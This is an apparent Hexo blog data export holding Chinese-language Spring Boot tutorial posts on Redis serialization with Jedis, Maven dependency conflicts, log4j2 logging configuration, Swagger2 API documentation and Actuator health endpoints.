class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.example.redisdemo.jedis;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\">//序列化工具类</span><br><span class=\"line\">public class ObjectTranscoder &#123;</span><br><span class=\"line\">    public static byte[] serialize(Object value) &#123;</span><br><span class=\"line\">        if (value == null) &#123;</span><br><span class=\"line\">            throw new NullPointerException(&quot;Can&apos;t serialize null&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        byte[] rv=null;</span><br><span class=\"line\">        ByteArrayOutputStream bos = null;</span><br><span class=\"line\">        ObjectOutputStream os = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            bos = new ByteArrayOutputStream();</span><br><span class=\"line\">            os = new ObjectOutputStream(bos);</span><br><span class=\"line\">            os.writeObject(value);</span><br><span class=\"line\">            os.close();</span><br><span class=\"line\">            bos.close();</span><br><span class=\"line\">            rv = bos.toByteArray();</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            throw new IllegalArgumentException(&quot;Non-serializable object&quot;, e);</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(os!=null)os.close();</span><br><span class=\"line\">                if(bos!=null)bos.close();</span><br><span class=\"line\">            &#125;catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Object deserialize(byte[] in) &#123;</span><br><span class=\"line\">        Object rv=null;</span><br><span class=\"line\">        ByteArrayInputStream bis = null;</span><br><span class=\"line\">        ObjectInputStream is = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            if(in != null) &#123;</span><br><span class=\"line\">                bis=new ByteArrayInputStream(in);</span><br><span class=\"line\">                is=new ObjectInputStream(bis);</span><br><span class=\"line\">                rv=is.readObject();</span><br><span class=\"line\">                is.close();</span><br><span class=\"line\">                bis.close();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;finally &#123;</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                if(is!=null)is.close();</span><br><span class=\"line\">                if(bis!=null)bis.close();</span><br><span class=\"line\">            &#125; catch (Exception e2) &#123;</span><br><span class=\"line\">                e2.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return rv;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.maven包冲突<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis --&gt;</span><br><span class=\"line\"> &lt;!--&lt;dependency&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class=\"line\">     &lt;!--&lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;--&gt;</span><br><span class=\"line\"> &lt;!--&lt;/dependency&gt;--&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;2.7.3&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br><span class=\"line\"> &lt;dependency&gt;</span><br><span class=\"line\">     &lt;groupId&gt;com.wandoulabs.jodis&lt;/groupId&gt;</span><br><span class=\"line\">     &lt;artifactId&gt;jodis&lt;/artifactId&gt;</span><br><span class=\"line\">     &lt;version&gt;0.2.2&lt;/version&gt;</span><br><span class=\"line\"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>springboot自己集成的spring-boot-data-redis与redis-clients有冲突<br><br>redis-clients可以与jodis配合使用，所以选择redis-clients.</p>\n<p>3.关于redis过期时间<br>redis默认不过期，当内存满时，删除先存入的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//存短信记录,首次，设置过期时间</span><br><span class=\"line\">   public void setJodisWithTime(String key, Object value, int time)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //set(String, String) 所以List需要序列化，有效时间为time</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   //存短信记录，不重新设置过期时间,使用原有的</span><br><span class=\"line\">   public void setJodis(String key, Object value)&#123;</span><br><span class=\"line\">       Jedis jedis = jedisResourcePool.getResource();</span><br><span class=\"line\">       //使用原有时间</span><br><span class=\"line\">       int time = Integer.parseInt(String.valueOf(jedis.ttl(key)));</span><br><span class=\"line\">       jedis.setex(key.getBytes(),time, FrequencyVerifiy.serialize(value));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"springbootdemo","date":"2018-11-23T07:47:52.000Z","_content":"### springboot架子搭建\n\n#### 1.日志\n\n##### （1）log4j2\n- 依赖\n```\n       <!--引入log4j2-->\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-log4j2</artifactId>\n       </dependency>\n       <!--log4j2依赖于disruptor-->\n       <dependency>\n           <groupId>com.lmax</groupId>\n           <artifactId>disruptor</artifactId>\n           <version>3.4.2</version>\n       </dependency>\n```\n- 配置文件log4j2.xml\nlog4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，\n    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)\n  -->\n<Configuration status=\"INFO\">\n    <!-- 日志文件目录和压缩文件目录配置 -->\n    <Properties>\n        <Property name=\"fileName\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2</Property>\n        <Property name=\"fileGz\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z</Property>\n    </Properties>\n    <!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式-->\n    <Appenders>\n        <!-- 输出控制台日志的配置 -->\n        <Console name=\"console\" target=\"SYSTEM_OUT\">\n            <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->\n            <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/>\n            <!-- 输出日志的格式 -->\n            <PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </Console>\n\n        <!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->\n        <RollingRandomAccessFile name=\"infoFile\" fileName=\"${fileName}/log-info.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-info.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录info和warn级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"DENY\" onMismatch=\"NEUTRAL\"/>\n                <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n\n        <!-- 存储所有error信息 -->\n        <RollingRandomAccessFile name=\"errorFile\" fileName=\"${fileName}/log-error.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-error.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录error级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n    </Appenders>\n\n    <!-- 全局配置，默认所有的Logger都继承此配置 -->\n    <Loggers>\n        <!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 -->\n        <AsyncRoot level=\"info\" additivity=\"false\">\n            <AppenderRef ref=\"console\"/>\n            <AppenderRef ref=\"infoFile\"/>\n            <AppenderRef ref=\"errorFile\"/>\n        </AsyncRoot>\n    </Loggers>\n</Configuration>\n```\n- 使用\n```\n@Controller\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @RequestMapping(value = \"test\", method = RequestMethod.GET)\n    @ResponseBody\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n}\n```\n\n#### 2.Restful API\n使用swagger2\n- 依赖\n```\n    <!-- Swagger依赖 注意版本一致-->\n    <dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n```\n- 配置类\n```\n@Configuration\n@EnableSwagger2\npublic class Swagger2 {\n    /**\n     * apis()设置监控路径\n     * @return\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo())\n                .select()\n                .apis(RequestHandlerSelectors.basePackage(\"com.example.springboottemplate.controllers\"))\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * 创建api基本信息，会展示在文档页面\n     * @return\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(\"Swagger2 demo\")\n                .description(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n                .version(\"1.0\")\n                .build();\n    }\n}\n```\n- 使用<br>\n  <strong>注意：要使用@RequestParam()接收参数，需要paramType=\"query\"</strong><br>\n  具体参数信息:https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\n\n```\n@Api(value = \"测试接口类TestController\")\n@Controller\n@ResponseBody\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @ApiOperation(value = \"测试get不带参数\",notes = \"测试get不带参数\")\n    @RequestMapping(value = \"test1\", method = RequestMethod.GET)\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试get带参数\",notes = \"测试get带参数\")\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, dataType = \"String\",paramType = \"query\")\n    @RequestMapping(value = \"test2\", method = RequestMethod.GET)\n    public String test2(@RequestParam(\"username\") String username){\n        if(!username.equals(\"\") && username != null){\n            System.out.println(username);\n            return username;\n        }else {\n            return \"null\";\n        }\n    }\n\n    @ApiOperation(value = \"测试post带实体参数\", notes = \"测试post带实体参数\")\n    @ApiImplicitParam(name = \"user\",value = \"用户名\",required = true, dataType = \"Map<String,Object>\")\n    @ApiResponses({\n           @ApiResponse(code = 400, message = \"请求参数没填好,注意为json\"),\n           @ApiResponse(code = 404, message = \"请求路径没有或页面跳转路径不对\"),\n           @ApiResponse(code = 500, message = \"服务器端发生错误\")\n   })\n    @RequestMapping(value = \"/test3\", method = RequestMethod.POST)\n    public String test3(@RequestBody Map<String,Object> user){\n        System.out.println(user.get(\"username\").toString());\n        System.out.println(user.get(\"password\").toString());\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试post参数为String\", notes = \"测试post参数为String\")\n    @ApiImplicitParams({\n            @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\"),\n            @ApiImplicitParam(name = \"password\", value = \"密码\", required = true, paramType = \"query\", dataType = \"String\")\n    })\n    @RequestMapping(value = \"/test4\", method = RequestMethod.POST)\n    public String test4(@RequestParam(\"username\") String username,\n                        @RequestParam(\"password\") String passwprd){\n       return username + \":\" + passwprd;\n    }\n\n    @ApiOperation(value = \"测试restful类型接口\", notes = \"测试restful类型接口\")\n    @RequestMapping(value = \"/test5/{name}\", method = RequestMethod.GET)\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\")\n    public String test5(@PathVariable(\"name\") String name,\n                        @RequestParam(\"username\") String username){\n        return name + \" : \" + username;\n    }\n}\n```\n\n访问:http://127.0.0.1:8080/swagger-ui.html\n\n#### 3.Health\n这是2.0版本：https://blog.csdn.net/alinyua/article/details/80009435<br>\n可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息\n- 依赖\n```\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-actuator</artifactId>\n           <!--<version>2.1.0.RELEASE</version>-->\n       </dependency>\n```\n- Springboot2版本需要在application.properties加入\n```\nmanagement.endpoints.web.exposure.include=*\n#显示所有健康状态，需要加配置\nmanagement.endpoint.health.show-details=always\n```\n 内置EndPoints：\n >http://127.0.0.1:8080/actuator<br>\n http://127.0.0.1:8080/actuator/health<br>\n http://127.0.0.1:8080/actuator/info<br>\n http://127.0.0.1:8080/actuator/beans<br>\n http://127.0.0.1:8080/actuator/httptrace\n\n\n #### 4.Eureka\n","source":"_posts/java/springbootdemo.md","raw":"---\ntitle: springbootdemo\ndate: 2018-11-23 15:47:52\ntags: [springboot]\n---\n### springboot架子搭建\n\n#### 1.日志\n\n##### （1）log4j2\n- 依赖\n```\n       <!--引入log4j2-->\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-log4j2</artifactId>\n       </dependency>\n       <!--log4j2依赖于disruptor-->\n       <dependency>\n           <groupId>com.lmax</groupId>\n           <artifactId>disruptor</artifactId>\n           <version>3.4.2</version>\n       </dependency>\n```\n- 配置文件log4j2.xml\nlog4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，\n    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)\n  -->\n<Configuration status=\"INFO\">\n    <!-- 日志文件目录和压缩文件目录配置 -->\n    <Properties>\n        <Property name=\"fileName\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2</Property>\n        <Property name=\"fileGz\">C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z</Property>\n    </Properties>\n    <!--appender主要作用就是：①控制打印日志的地方、②打印日志的输出格式-->\n    <Appenders>\n        <!-- 输出控制台日志的配置 -->\n        <Console name=\"console\" target=\"SYSTEM_OUT\">\n            <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch）-->\n            <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\"/>\n            <!-- 输出日志的格式 -->\n            <PatternLayout pattern=\"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n\"/>\n        </Console>\n\n        <!-- 打印出所有的信息，每次大小超过size，则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->\n        <RollingRandomAccessFile name=\"infoFile\" fileName=\"${fileName}/log-info.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-info.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录info和warn级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"DENY\" onMismatch=\"NEUTRAL\"/>\n                <ThresholdFilter level=\"info\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n\n        <!-- 存储所有error信息 -->\n        <RollingRandomAccessFile name=\"errorFile\" fileName=\"${fileName}/log-error.log\" immediateFlush=\"false\"\n                                 filePattern=\"${fileGz}/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log-error.gz\">\n            <PatternLayout pattern=\"%d{yyyy-MM-dd 'at' HH:mm:ss z} [%t] %-5level %logger{36} %L %M - %msg%xEx%n\" />\n            <Policies>\n                <TimeBasedTriggeringPolicy interval=\"6\" modulate=\"true\" />\n                <SizeBasedTriggeringPolicy size=\"100 MB\"/>\n            </Policies>\n            <Filters>\n                <!-- 只记录error级别信息 -->\n                <ThresholdFilter level=\"error\" onMatch=\"ACCEPT\" onMismatch=\"DENY\" />\n            </Filters>\n            <!-- 指定每天的最大压缩包个数，默认7个，超过了会覆盖之前的 -->\n            <DefaultRolloverStrategy max=\"50\"/>\n        </RollingRandomAccessFile>\n    </Appenders>\n\n    <!-- 全局配置，默认所有的Logger都继承此配置 -->\n    <Loggers>\n        <!-- AsyncRoot - 异步记录日志 - 需要LMAX Disruptor的支持 -->\n        <AsyncRoot level=\"info\" additivity=\"false\">\n            <AppenderRef ref=\"console\"/>\n            <AppenderRef ref=\"infoFile\"/>\n            <AppenderRef ref=\"errorFile\"/>\n        </AsyncRoot>\n    </Loggers>\n</Configuration>\n```\n- 使用\n```\n@Controller\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @RequestMapping(value = \"test\", method = RequestMethod.GET)\n    @ResponseBody\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n}\n```\n\n#### 2.Restful API\n使用swagger2\n- 依赖\n```\n    <!-- Swagger依赖 注意版本一致-->\n    <dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n\t\t<dependency>\n\t\t\t<groupId>io.springfox</groupId>\n\t\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t\t<version>2.2.2</version>\n\t\t</dependency>\n```\n- 配置类\n```\n@Configuration\n@EnableSwagger2\npublic class Swagger2 {\n    /**\n     * apis()设置监控路径\n     * @return\n     */\n    @Bean\n    public Docket createRestApi() {\n        return new Docket(DocumentationType.SWAGGER_2)\n                .apiInfo(apiInfo())\n                .select()\n                .apis(RequestHandlerSelectors.basePackage(\"com.example.springboottemplate.controllers\"))\n                .paths(PathSelectors.any())\n                .build();\n    }\n\n    /**\n     * 创建api基本信息，会展示在文档页面\n     * @return\n     */\n    private ApiInfo apiInfo() {\n        return new ApiInfoBuilder()\n                .title(\"Swagger2 demo\")\n                .description(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n                .version(\"1.0\")\n                .build();\n    }\n}\n```\n- 使用<br>\n  <strong>注意：要使用@RequestParam()接收参数，需要paramType=\"query\"</strong><br>\n  具体参数信息:https://amphilicitezh.github.io/2017/12/04/swaggerui-introduce/\n\n```\n@Api(value = \"测试接口类TestController\")\n@Controller\n@ResponseBody\npublic class TestController {\n    Logger logger = LogManager.getLogger(TestController.class);\n\n    @ApiOperation(value = \"测试get不带参数\",notes = \"测试get不带参数\")\n    @RequestMapping(value = \"test1\", method = RequestMethod.GET)\n    public String test(){\n        logger.debug(\"test debug\");\n        logger.info(\"test info\");\n        logger.warn(\"test warn\");\n        logger.error(\"test error\");\n        logger.fatal(\"test fatal\");\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试get带参数\",notes = \"测试get带参数\")\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, dataType = \"String\",paramType = \"query\")\n    @RequestMapping(value = \"test2\", method = RequestMethod.GET)\n    public String test2(@RequestParam(\"username\") String username){\n        if(!username.equals(\"\") && username != null){\n            System.out.println(username);\n            return username;\n        }else {\n            return \"null\";\n        }\n    }\n\n    @ApiOperation(value = \"测试post带实体参数\", notes = \"测试post带实体参数\")\n    @ApiImplicitParam(name = \"user\",value = \"用户名\",required = true, dataType = \"Map<String,Object>\")\n    @ApiResponses({\n           @ApiResponse(code = 400, message = \"请求参数没填好,注意为json\"),\n           @ApiResponse(code = 404, message = \"请求路径没有或页面跳转路径不对\"),\n           @ApiResponse(code = 500, message = \"服务器端发生错误\")\n   })\n    @RequestMapping(value = \"/test3\", method = RequestMethod.POST)\n    public String test3(@RequestBody Map<String,Object> user){\n        System.out.println(user.get(\"username\").toString());\n        System.out.println(user.get(\"password\").toString());\n        return \"ok\";\n    }\n\n    @ApiOperation(value = \"测试post参数为String\", notes = \"测试post参数为String\")\n    @ApiImplicitParams({\n            @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\"),\n            @ApiImplicitParam(name = \"password\", value = \"密码\", required = true, paramType = \"query\", dataType = \"String\")\n    })\n    @RequestMapping(value = \"/test4\", method = RequestMethod.POST)\n    public String test4(@RequestParam(\"username\") String username,\n                        @RequestParam(\"password\") String passwprd){\n       return username + \":\" + passwprd;\n    }\n\n    @ApiOperation(value = \"测试restful类型接口\", notes = \"测试restful类型接口\")\n    @RequestMapping(value = \"/test5/{name}\", method = RequestMethod.GET)\n    @ApiImplicitParam(name = \"username\", value = \"用户名\", required = true, paramType = \"query\", dataType = \"String\")\n    public String test5(@PathVariable(\"name\") String name,\n                        @RequestParam(\"username\") String username){\n        return name + \" : \" + username;\n    }\n}\n```\n\n访问:http://127.0.0.1:8080/swagger-ui.html\n\n#### 3.Health\n这是2.0版本：https://blog.csdn.net/alinyua/article/details/80009435<br>\n可以直观的看到自己CPU的利用率、内存的利用率、数据库连接是否正常等信息\n- 依赖\n```\n       <dependency>\n           <groupId>org.springframework.boot</groupId>\n           <artifactId>spring-boot-starter-actuator</artifactId>\n           <!--<version>2.1.0.RELEASE</version>-->\n       </dependency>\n```\n- Springboot2版本需要在application.properties加入\n```\nmanagement.endpoints.web.exposure.include=*\n#显示所有健康状态，需要加配置\nmanagement.endpoint.health.show-details=always\n```\n 内置EndPoints：\n >http://127.0.0.1:8080/actuator<br>\n http://127.0.0.1:8080/actuator/health<br>\n http://127.0.0.1:8080/actuator/info<br>\n http://127.0.0.1:8080/actuator/beans<br>\n http://127.0.0.1:8080/actuator/httptrace\n\n\n #### 4.Eureka\n","slug":"java/springbootdemo","published":1,"updated":"2018-11-27T09:31:43.145Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64053300236cvpx9bbc4m7","content":"<h3 id=\"springboot架子搭建\"><a href=\"#springboot架子搭建\" class=\"headerlink\" title=\"springboot架子搭建\"></a>springboot架子搭建</h3><h4 id=\"1-日志\"><a href=\"#1-日志\" class=\"headerlink\" title=\"1.日志\"></a>1.日志</h4><h5 id=\"（1）log4j2\"><a href=\"#（1）log4j2\" class=\"headerlink\" title=\"（1）log4j2\"></a>（1）log4j2</h5><ul>\n<li><p>依赖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--引入log4j2--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br><span class=\"line\">&lt;!--log4j2依赖于disruptor--&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;com.lmax&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;disruptor&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;3.4.2&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置文件log4j2.xml<br>log4j2默认会在classpath目录下寻找log4j.json、log4j.jsn、log4j2.xml等名称的文件，如果都没有找到，则会按默认配置输出，也就是输出到控制台</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!-- Configuration后面的status，这个用于设置log4j2自身内部的信息输出，可以不设置，当设置成trace时，</span><br><span class=\"line\">    你会看到log4j2内部各种详细输出。可以设置成OFF(关闭)或Error(只输出错误信息)</span><br><span class=\"line\">  --&gt;</span><br><span class=\"line\">&lt;Configuration status=&quot;INFO&quot;&gt;</span><br><span class=\"line\">    &lt;!-- 日志文件目录和压缩文件目录配置 --&gt;</span><br><span class=\"line\">    &lt;Properties&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileName&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2&lt;/Property&gt;</span><br><span class=\"line\">        &lt;Property name=&quot;fileGz&quot;&gt;C:\\\\Users\\\\xiong\\\\Desktop\\\\log\\\\log4j2\\\\7z&lt;/Property&gt;</span><br><span class=\"line\">    &lt;/Properties&gt;</span><br><span class=\"line\">    